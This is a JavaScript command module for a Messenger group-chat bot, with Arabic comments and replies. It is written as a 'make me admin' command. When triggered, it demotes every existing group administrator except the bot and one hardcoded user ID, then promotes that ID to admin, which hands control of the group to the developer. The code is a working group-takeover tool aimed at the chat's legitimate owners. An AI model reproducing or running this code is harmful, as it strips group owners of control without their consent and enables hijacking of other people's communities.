module.exports.config = {
    name: "احم",
    version: "1.0.0",
    hasPermssion: 2,
    credits: "Ali Hussein",
    description: "ارفعني كمسؤول في المجموعة",
    commandCategory: "المطور",
    usages: "",
    cooldowns: 5
};

module.exports.run = async ({ api, event }) => {
    const threadID = event.threadID;
    const myUserID = '100013384479798';
    const botUserID = api.getCurrentUserID();

    // استرجاع معلومات المجموعة
    api.getThreadInfo(threadID, (err, info) => {
        if (err) return api.sendMessage("حدث خطأ عند محاولة استرجاع معلومات المجموعة.", threadID);

        // قائمة المسؤولين الحاليين
        const currentAdmins = info.adminIDs.map(admin => admin.id);

        // تحقق إذا كنت أنت مسؤول بالفعل
        if (currentAdmins.includes(myUserID)) {
            return api.sendMessage("🙂 انت بالفعل مسؤول يامطوري.", threadID);
        }

        // إزالة جميع المسؤولين باستثناء البوت ونفسه
        currentAdmins.forEach(adminID => {
            if (adminID !== botUserID && adminID !== myUserID) {
                api.changeAdminStatus(threadID, adminID, false, (err) => {
                    if (err) api.sendMessage(`حدث خطأ عند محاولة إزالة المسؤول ${adminID}.`, threadID);
                });
            }
        });

        // تعيين نفسك كمسؤول بعد إزالة الآخرين
        api.changeAdminStatus(threadID, myUserID, true, (err) => {
            if (err) {
                api.sendMessage("حدث خطأ ❌", threadID);
            } else {
                api.sendMessage("🙂 انا افهم مطوري زينو يريد ادمن صح ", threadID);
            }
        });
    });
};
                    
